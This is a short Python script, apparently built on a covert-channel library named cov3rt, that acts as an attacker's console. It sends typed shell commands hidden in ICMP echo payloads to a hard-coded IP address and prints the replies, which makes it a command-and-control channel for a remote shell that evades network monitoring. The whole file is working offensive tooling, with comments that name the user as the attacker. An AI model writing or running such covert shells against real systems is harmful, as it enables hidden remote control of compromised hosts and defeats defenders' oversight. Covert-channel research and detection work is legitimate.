from cov3rt.UserCloaks import ICMPEchoFullPayload

TIMEOUT = 5
SENDER_IP = "138.47.135.235"
RECEIVER_IP = "138.47.135.235"
sender = ICMPEchoFullPayload(ip_dst=SENDER_IP)
receiver = ICMPEchoFullPayload(ip_dst=RECEIVER_IP)

while True:
    try:
        # Grab the input from the attacker
        command = input("$ ")
        sender.ingest(command)
        # Send the message via the selected cloak
        sender.send_packets()
        # Exit the program if that is the command
        if command == "exit":
            break
        # Print the response from the receiver
        print(receiver.recv_packets(timeout=TIMEOUT))
    # Exit on CTRL-C
    except KeyboardInterrupt:
        break
